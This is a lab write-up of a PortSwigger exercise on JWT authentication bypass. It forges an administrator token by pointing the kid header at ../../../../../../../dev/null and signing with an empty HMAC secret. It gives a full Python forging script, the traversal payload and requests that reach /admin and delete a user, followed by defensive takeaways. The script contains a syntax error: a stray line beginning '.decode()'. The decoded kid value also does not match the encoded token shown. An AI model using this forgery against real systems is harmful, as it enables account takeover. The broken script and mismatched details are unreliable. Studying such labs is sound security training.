# Lab: JWT authentication bypass via kid header path traversal
## LAB DESC
```
This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.

To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

## SOLUTION


# 1. Log in to the Application

Log in using the provided credentials:

```text
Username: wiener
Password: peter
```

After logging in, intercept the request to:

```http
GET /my-account
```

The request contains a JWT in the session cookie:

```http
Cookie: session=JWT_TOKEN
```

Copy this JWT for further analysis.

---

# 2. Analyze the JWT

A JWT consists of three Base64URL-encoded components:

```text
HEADER.PAYLOAD.SIGNATURE
```

For example:

```text
eyJ...header...eyJ...payload...signature...
```

The original JWT used in this lab was:

```text
eyJraWQiOiI2YmRmOTMxOC1jMWViLTRmZDItYjI0Ni1hYTBkMmEwMzA2NWMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NjM2NjA3MSwic3ViIjoid2llbmVyIn0.RzDGRz2k4MdHqoF3NqnNw7K4i_1iAohVw_P5bw6Ld0k
```

## Header

Decoding the header gives:

```json
{
  "kid": "6bdf9318-c1eb-4fd2-b246-aa0d2ea03065c",
  "alg": "HS256"
}
```

The important parameter is:

```text
kid
```

`kid` stands for **Key ID** and is commonly used by applications to identify which cryptographic key should be used to verify a JWT.

---

## Payload

The payload decodes to:

```json
{
  "iss": "portswigger",
  "exp": 1786366071,
  "sub": "wiener"
}
```

The important claim here is:

```text
sub
```

`sub` means **subject** and identifies the user represented by the token.

Currently:

```text
sub = wiener
```

We want:

```text
sub = administrator
```

---

# 3. Identify the Vulnerability

The application is vulnerable because it apparently uses the `kid` value to construct a filesystem path when retrieving the JWT signing key.

Conceptually, the server may be doing something similar to:

```text
/path/to/keys/<kid>
```

If `kid` is not properly validated, a path traversal sequence can escape the intended directory.

For example:

```text
../../../../../../../dev/null
```

can resolve to:

```text
/dev/null
```

On Linux systems, `/dev/null` is a special device that contains no readable data.

Therefore, if the application reads `/dev/null` as the JWT secret, the resulting secret is effectively an empty string.

---

# 4. Modify the JWT Header

Change:

```json
{
  "kid": "6bdf9318-c1eb-4fd2-b246-aa0d2ea03065c",
  "alg": "HS256"
}
```

to:

```json
{
  "kid": "../../../../../../../dev/null",
  "alg": "HS256"
}
```

The important change is:

```text
6bdf9318-c1eb-4fd2-b246-aa0d2ea03065c
```

to:

```text
../../../../../../../dev/null
```

---

# 5. Modify the JWT Payload

Change:

```json
{
  "iss": "portswigger",
  "exp": 1786366071,
  "sub": "wiener"
}
```

to:

```json
{
  "iss": "portswigger",
  "exp": 1786366071,
  "sub": "administrator"
}
```

We preserve the other claims and modify only the `sub` claim.

---

# 6. Sign the Modified JWT

The JWT uses:

```text
HS256
```

HS256 means:

```text
HMAC + SHA-256
```

The signing operation is conceptually:

```text
HMAC-SHA256(secret, base64url(header) + "." + base64url(payload))
```

Because the vulnerable `kid` points to:

```text
/dev/null
```

the signing secret is:

```text
empty string
```

Therefore:

```text
secret = ""
```

The signature can be generated with Python.

---

# 7. Generate the JWT Without Burp JWT Editor

The following Python script modifies the original JWT and generates the new signature:

```python
import base64
import json
import hmac
import hashlib

original_token = "eyJraWQiOiI2YmRmOTMxOC1jMWViLTRmZDItYjI0Ni1hYTBkMmEwMzA2NWMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NjM2NjA3MSwic3ViIjoid2llbmVyIn0.RzDGRz2k4MdHqoF3NqnNw7K4i_1iAohVw_P5bw6Ld0k"

def decode_part(part):
    part += "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(part))

def encode_part(obj):
    data = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# Split JWT
old_header, old_payload, old_signature = original_token.split(".")

# Decode header and payload
header = decode_part(old_header)
payload = decode_part(old_payload)

# Modify header
header["kid"] = "../../../../../../../dev/null"
header["alg"] = "HS256"

# Modify payload
payload["sub"] = "administrator"

# Encode modified header and payload
header_encoded = encode_part(header)
payload_encoded = encode_part(payload)

# Construct signing input
message = f"{header_encoded}.{payload_encoded}"

# Empty secret because /dev/null contains no data
signature = hmac.new(
    b"",
    message.encode(),
    hashlib.sha256
).digest()

# Base64URL encode signature
signature_encoded = base64.urlsafe_b64encode(
    signature
).rstrip(b"=")
.decode()

# Construct final JWT
new_token = f"{message}.{signature_encoded}"

print("New JWT:")
print(new_token)
```

Save it as:

```text
jwt.py
```

Run:

```bash
python3 jwt.py
```

The script produces a new JWT containing:

```text
kid = ../../../../../../../dev/null
alg = HS256
sub = administrator
```

with a signature generated using an empty secret.

---

# 8. Send the Modified JWT

In Burp Repeater, modify the request to:

```http
GET /admin HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=NEW_JWT
```

Replace `NEW_JWT` with the token generated by the Python script.

Send the request.

If successful, the response contains the administrator interface.

---

# 9. Delete `carlos`

The administrator panel contains the endpoint:

```text
/admin/delete?username=carlos
```

Send:

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=NEW_JWT
```

The lab should now be solved.

---

# Attack Flow

The complete attack can be summarized as:

```text
Original JWT
     |
     v
Change "sub"
wiener -> administrator
     |
     v
Change "kid"
normal-key -> ../../../../../../../dev/null
     |
     v
Server resolves path
/dev/null
     |
     v
/dev/null contains no data
     |
     v
Empty signing secret
     |
     v
Sign JWT using HS256 + empty secret
     |
     v
Send forged JWT
     |
     v
Server accepts token
     |
     v
Authenticated as administrator
     |
     v
/admin/delete?username=carlos
```

---

# Why the Attack Works

The vulnerability exists because the application trusts the `kid` header when selecting the JWT verification key.

The application effectively allows attacker-controlled input to influence a filesystem path.

The attacker changes:

```text
kid
```

to:

```text
../../../../../../../dev/null
```

This causes the application to read:

```text
/dev/null
```

as the signing key.

Because `/dev/null` provides no data, the application ends up using an empty key.

The attacker can therefore calculate a valid HS256 signature without knowing the application's intended secret.

At the same time, changing:

```text
sub=wiener
```

to:

```text
sub=administrator
```

causes the application to interpret the forged token as belonging to the administrator.

---

# Key Takeaways

## 1. Never trust `kid`

The `kid` parameter should not be allowed to directly control filesystem paths.

Bad:

```text
/path/to/keys/<kid>
```

Better approaches include mapping predefined key IDs to known keys.

---

## 2. Prevent Path Traversal

User-controlled paths must be properly validated and normalized.

Dangerous input:

```text
../../../../../../../dev/null
```

Applications should prevent traversal outside the intended key directory.

---

## 3. Validate JWT Algorithms

The server should enforce the expected algorithm rather than blindly trusting the JWT's `alg` header.

For example, if an application expects:

```text
RS256
```

it should not unexpectedly accept:

```text
HS256
```

with an attacker-controlled key.

---

## 4. JWT Signature Verification Does Not Mean the JWT Is Safe

A JWT can have a perfectly valid cryptographic signature while still containing malicious claims.

In this attack, the forged token is correctly signed:

```text
HS256(empty_secret)
```

but the attacker controls:

```text
sub=administrator
```

The underlying problem is therefore not simply "JWTs are insecure"; it is the application's insecure key lookup and JWT validation logic.

---

# Vulnerability Chain

```text
User-controlled kid
        +
Path traversal
        +
/dev/null
        +
Empty signing key
        +
HS256
        +
Modified sub claim
        =
JWT authentication bypass
```

## Tools Used

* Burp Suite Repeater
* Python 3
* Base64URL decoding/encoding
* HMAC-SHA256

## References

* PortSwigger Web Security Academy — JWT vulnerabilities
* JWT (JSON Web Token)
* HMAC-SHA256 (HS256)
